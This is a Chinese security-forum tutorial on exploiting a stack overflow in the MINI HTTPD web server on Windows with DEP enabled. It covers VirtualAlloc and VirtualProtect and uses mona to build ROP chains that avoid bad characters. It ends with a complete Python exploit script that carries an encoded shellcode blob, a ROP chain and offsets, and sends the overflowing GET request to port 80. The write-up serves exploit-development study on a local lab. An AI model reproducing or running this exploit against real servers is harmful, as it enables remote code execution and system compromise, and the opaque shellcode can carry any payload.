# MINI HTTPD 远程代码执行漏洞绕过DEP

> **来源**: https://forum.butian.net/share/2894  
> **文章ID**: 2894

---

MINI HTTPD 远程代码执行漏洞绕过DEP
========================

前言
--

在上一篇文章中，我们关闭（其实是默认关闭）了系统的DEP，本文我们将在开启DEP的系统上绕过DEP保护来实现EXP的编写。  
首先开启DEP并重启虚拟机：

![Pasted image 20240331164605.png](images/attach-72376897f4d0ca61beec7caf632835359c6df50e.png)

此时再运行我们的poc，发现已经无法运行了：

![Pasted image 20240331165057.png](images/attach-7f10b9156eb84f0133b2b703dd44def9d77ea027.png)

windbg调试一下，发现内存非法访问：

![Pasted image 20240331165554.png](images/attach-a7a61edd2181686aa2cccc7c331cb9804ba7ec9c.png)

`eip=00c7dc6c`发生了内存访问冲突，因为DEP不允许我们在堆栈上运行代码，而堆栈正是我们放置和执行代码的地方。当我们激活DEP时，能够执行任意代码的方法是尝试在内存中搜索指向我们想要执行的某些指令的地址（return to libc），然后使用ret指令并将它们链接在堆栈上。构成的指令链就是所谓的 ROP（面向返回的编程）。

构造ROP
-----

使用ROP我们可以尝试创建需要执行的 shellcode，但不确定我们是否能够找到所有必要的指令。幸运的是Windows API 为我们提供了一系列功能，使我们能够将进程堆栈标记为可执行内存，一旦完成，我们将能够在堆栈上执行代码，就好像它是传统的漏洞一样。  
根据 Windows 版本的不同，有不同的API功能，最常用的是VirtualAlloc和VirtualProtect。

VirtualAlloc在[官方文档](https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc?redirectedfrom=MSDN)中使用语法为：

```c
LPVOID VirtualAlloc(
  [in, optional] LPVOID lpAddress,
  [in]           SIZE_T dwSize,
  [in]           DWORD  flAllocationType,
  [in]           DWORD  flProtect
);
```

VirtualAlloc接收的参数是开始预留的内存地址、要预留的内存大小（以字节为单位）、要进行的预留类型以及预留页的内存保护。最后一个参数，如果设置为`0x40(PAGE_EXECUTE_READWRITE)`，将允许我们在该保留内存区域中执行代码。

VirtualProtect在[官方文档](https://learn.microsoft.com/zh-cn/windows/win32/api/memoryapi/nf-memoryapi-virtualprotect?redirectedfrom=MSDN)中使用语法为：

```c
BOOL VirtualProtect(
  [in]  LPVOID lpAddress,
  [in]  SIZE_T dwSize,
  [in]  DWORD  flNewProtect,
  [out] PDWORD lpflOldProtect
);
```

VirtualProtect接收的参数用于更改保护的地址、要更改的区域的字节大小、所需的保护类型 （0x40） 以及指向将接收区域当前保护值的变量的指针。最后一个值必须是一个正确的变量，如果它为null或不存在的变量，则调用将失败。

我们在Immunity Debugger中运行`!mona rop`，来查找可利用的rop指令：  
生成的结果保存在了rop.txt、rop\_chains.txt、rop\_suggestions.txt、stackpivot.txt文件中。

![Pasted image 20240331185500.png](images/attach-2e7b0978d96d2adddbb6151bd60ffe71a534079b.png)

在rop\_chains.txt文件中，mona尝试生成一串指令来调用Virtualalloc 或Virtualprotect函数，并将堆栈标记为可执行，以便执行我们的shellcode。这串指令在 Python、Ruby 或 Javascript 中以函数的形式呈现，以便能够直接插入到我们的漏洞中。  
这是mona创建的函数，用于从python中调用Virtualalloc：

```python
*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x00000000,  # [-] Unable to find API pointer -> eax
      0x0040c17f,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [minihttpd.exe] 
      0x004176cf,  # PUSH EAX # POP ESI # RETN 0x04 [minihttpd.exe] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x0040b89b,  # POP EBP # RETN [minihttpd.exe] 
      0x41414141,  # Filler (RETN offset compensation)
      0x004165ec,  # & push esp # ret 0x0c [minihttpd.exe]
      #[---INFO:gadgets_to_set_ebx:---]
      0x0040d121,  # POP EBX # RETN [minihttpd.exe] 
      0x00000201,  # 0x00000201-> ebx
      #[---INFO:gadgets_to_set_edx:---]
      0x0040c1f6,  # POP EBX # RETN [minihttpd.exe] 
      0x00000040,  # 0x00000040-> edx
      0x0040c93c,  # XOR EDX,EDX # RETN [minihttpd.exe] 
      0x0040aeae,  # ADD EDX,EBX # POP EBX # RETN 0x10 [minihttpd.exe] 
      0x41414141,  # Filler (compensate)
      #[---INFO:gadgets_to_set_ecx:---]
      0x0040ef10,  # POP ECX # RETN [minihttpd.exe] 
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x41414141,  # Filler (RETN offset compensation)
      0x00420f95,  # &Writable location [minihttpd.exe]
      #[---INFO:gadgets_to_set_edi:---]
      0x00405be9,  # POP EDI # RETN [minihttpd.exe] 
      0x00403f01,  # RETN (ROP NOP) [minihttpd.exe]
      #[---INFO:gadgets_to_set_eax:---]
      0x0040d1ec,  # POP EAX # RETN [minihttpd.exe] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x00419126,  # PUSHAD # ADD AL,0 # RETN [minihttpd.exe] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()
```

但是这里面包含了坏字符，我们需要进行排除：

```php
!mona rop -cpb "\x00\x09\x0a\x0b\x0c\x0d\x20\x2f\x3f"
```

运行`mona rop`后，rop\_chains.txt文件我们将看到无法生成字符串，因为没有指令可以生成没有坏字符的字符串。  
默认情况下，当 mona 搜索 ROP 字符串时，它会丢弃操作系统自己的模块来查找gadget。在本例中，我们将强制 mona使用其他模块来查看是否能找到任何有效的字符串。直接在全部模块找可利用的Virtualalloc ROP：

```php
!mona rop -cpb "\x00\x09\x0a\x0b\x0c\x0d\x20\x2f\x3f" -m *.dll
```

这一次在rop\_chains.txt中，我们发现了以下内容：

```python
*** [ Python ] ***

  def create_rop_chain():

    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x77c34fcd,  # POP EAX # RETN [msvcrt.dll] 
      0x77dd121c,  # ptr to &VirtualAlloc() [IAT ADVAPI32.dll]
      0x77e82d1c,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
      0x77f53564,  # XCHG EAX,ESI # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c31a04,  # POP EBP # RETN [msvcrt.dll] 
      0x77df965b,  # & jmp esp [ADVAPI32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x77eed7ae,  # POP EAX # RETN [RPCRT4.dll] 
      0xffffffff,  # Value to negate, will become 0x00000001
      0x76fb1ded,  # NEG EAX # RETN [winrnr.dll] 
      0x77f301e4,  # XCHG EAX,EBX # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x7c87f229,  # POP EAX # RETN [kernel32.dll] 
      0xa2800fc0,  # put delta into eax (-> put 0x00001000 into edx)
      0x7c87fa01,  # ADD EAX,5D800040 # RETN 0x04 [kernel32.dll] 
      0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
      0x41414141,  # Filler (RETN offset compensation)
      #[---INFO:gadgets_to_set_ecx:---]
      0x77eed7ae,  # POP EAX # RETN [RPCRT4.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x5ad7e91c,  # NEG EAX # RETN [uxtheme.dll] 
      0x77c14001,  # XCHG EAX,ECX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_edi:---]
      0x7c902563,  # POP EDI # RETN [ntdll.dll] 
      0x77e8d224,  # RETN (ROP NOP) [RPCRT4.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x7c87fbcb,  # POP EAX # RETN [kernel32.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x7e423ad9,  # PUSHAD # RETN [USER32.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

  rop_chain = create_rop_chain()
```

现在，我们有一个有效的漏洞利用指令链，它将执行VirtualAlloc来更改进程堆栈的状态，并允许我们在其上执行代码。  
在我们之前的漏洞利用中，我们使用从USER32.dll获取的地址来执行`jmp esp`，该地址是为了执行ESP指向的代码。由于我们现在在ESP中拥有的不是代码，而是指向代码的指针，因此我们需要将该地址更改为ret。ret语句的作用是从堆栈顶部获取值并将其放入EIP（指向指令的指针）中。

生成rop.txt：

```php
!mona rop -cpb "\x00\x09\x0a\x0b\x0c\x0d\x20\x2f\x3f" -m *.dll
```

从rop.txt文件中，我们可以找到可利用的`# POP ECX # RETN`这种gadget，我们使用这一条：

```php
0x77c4017f :  # POP ECX # RETN    ** [msvcrt.dll] **   |   {PAGE_EXECUTE_READ}
```

这条指令的含义为：  
`POP ECX`：将从堆栈中弹出栈顶的值并将其存储在 ECX 寄存器中。  
`RETN`：弹出栈顶的值输入到EIP中，执行EIP。

计算跳转到shellcode的偏移（最好用`$+0x28`）：

```php
metasm > Interrupt: use the 'exit' command to quit
metasm > jmp $+0x24
"\xeb\x22"
```

![Pasted image 20240401161024.png](images/attach-4c5fab10fc67f48c237fb0f157fea506527efcb2.png)

```python
import sys
import socket
import struct

# Bad Chars: \x00\x09\x0a\x0b\x0c\x0d\x20\x2f\x3f'

offset_eip = 967
offset_shellcode = 103 # use to 'A'
EIP = struct.pack('<I', 0x77c4017f) # POP ECX, RET (msvcrt.dll)

JMP = '\xeb\x22' # jmp $+0x24 Jump to shellcode
buffer = 'A' * offset_shellcode

shellcode = ( 
"\xb8\x69\xfc\x2c\xd8\xdb\xc9\xd9\x74\x24\xf4\x5e\x29\xc9"
"\xb1\x31\x31\x46\x13\x83\xc6\x04\x03\x46\x66\x1e\xd9\x24"
"\x90\x5c\x22\xd5\x60\x01\xaa\x30\x51\x01\xc8\x31\xc1\xb1"
"\x9a\x14\xed\x3a\xce\x8c\x66\x4e\xc7\xa3\xcf\xe5\x31\x8d"
"\xd0\x56\x01\x8c\x52\xa5\x56\x6e\x6b\x66\xab\x6f\xac\x9b"
"\x46\x3d\x65\xd7\xf5\xd2\x02\xad\xc5\x59\x58\x23\x4e\xbd"
"\x28\x42\x7f\x10\x23\x1d\x5f\x92\xe0\x15\xd6\x8c\xe5\x10"
"\xa0\x27\xdd\xef\x33\xee\x2c\x0f\x9f\xcf\x81\xe2\xe1\x08"
"\x25\x1d\x94\x60\x56\xa0\xaf\xb6\x25\x7e\x25\x2d\x8d\xf5"
"\x9d\x89\x2c\xd9\x78\x59\x22\x96\x0f\x05\x26\x29\xc3\x3d"
"\x52\xa2\xe2\x91\xd3\xf0\xc0\x35\xb8\xa3\x69\x6f\x64\x05"
"\x95\x6f\xc7\xfa\x33\xfb\xe5\xef\x49\xa6\x63\xf1\xdc\xdc"
"\xc1\xf1\xde\xde\x75\x9a\xef\x55\x1a\xdd\xef\xbf\x5f\x11"
"\xba\xe2\xc9\xba\x63\x77\x48\xa7\x93\xad\x8e\xde\x17\x44"
"\x6e\x25\x07\x2d\x6b\x61\x8f\xdd\x01\xfa\x7a\xe2\xb6\xfb"
"\xae\x81\x59\x68\x32\x68\xfc\x08\xd1\x74"
)

  def create_rop_chain():
    # rop chain generated with mona.py - www.corelan.be
    rop_gadgets = [
      #[---INFO:gadgets_to_set_esi:---]
      0x77c21d16,  # POP EAX # RETN [msvcrt.dll] 
      0x77e71210,  # ptr to &VirtualProtect() [IAT RPCRT4.dll]
      0x77e87a76,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [RPCRT4.dll] 
      0x5d0f11f6,  # XCHG EAX,ESI # RETN [COMCTL32.dll] 
      #[---INFO:gadgets_to_set_ebp:---]
      0x77c20583,  # POP EBP # RETN [msvcrt.dll] 
      0x77df965b,  # & jmp esp [ADVAPI32.dll]
      #[---INFO:gadgets_to_set_ebx:---]
      0x76f3c426,  # POP EAX # RETN [DNSAPI.dll] 
      0xfffffdff,  # Value to negate, will become 0x00000201
      0x77dd9b06,  # NEG EAX # RETN [ADVAPI32.dll] 
      0x77f301e4,  # XCHG EAX,EBX # RETN [GDI32.dll] 
      #[---INFO:gadgets_to_set_edx:---]
      0x7c87f318,  # POP EAX # RETN [kernel32.dll] 
      0xffffffc0,  # Value to negate, will become 0x00000040
      0x76f75057,  # NEG EAX # RETN [WLDAP32.dll] 
      0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll] 
      #[---INFO:gadgets_to_set_ecx:---]
      0x77c521ee,  # POP ECX # RETN [msvcrt.dll] 
      0x7e47292c,  # &Writable location [USER32.dll]
      #[---INFO:gadgets_to_set_edi:---]
      0x7c902579,  # POP EDI # RETN [ntdll.dll] 
      0x77e8d224,  # RETN (ROP NOP) [RPCRT4.dll]
      #[---INFO:gadgets_to_set_eax:---]
      0x7c880176,  # POP EAX # RETN [kernel32.dll] 
      0x90909090,  # nop
      #[---INFO:pushad:---]
      0x77dfc5ee,  # PUSHAD # RETN [ADVAPI32.dll] 
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop = create_rop_chain()

# payload = 'A' * 103 + shellcode + 'A' * (until 967) + EIP + '\xff\xff\xff\xff' + rop + JMP + 'E' * (until 1500)

buffer += shellcode
buffer += 'A' * (offset_eip - len(buffer))
buffer += EIP
buffer += '\xff\xff\xff\xff' # value poped to ECX (padding)
buffer += rop
buffer += JMP
buffer += 'E' * (1500 - len(buffer))
HOST = '127.0.0.1'
PORT = 80

req = "GET /"+buffer+"HTTP/1.1\r\n\r\n"
print "Sending "+str(len(req))+" bytes."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))
s.send(req)
data = s.recv(1024)
s.close()
print 'Received', repr(data)
```

可以看到已经可以正常弹出计算器了：

![Pasted image 20240401151658.png](images/attach-6d04947787e3db15d907bbcce503b3938b316cf1.png)

参考链接
----

[Windows Shellcode学习笔记——利用VirtualAlloc绕过DEP](https://3gstudent.github.io/backup-3gstudent.github.io/Windows-Shellcode%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%88%A9%E7%94%A8VirtualAlloc%E7%BB%95%E8%BF%87DEP/)  
[dep-bypass-mini-httpd-server-1-2](https://hardsec.net/dep-bypass-mini-httpd-server-1-2/)
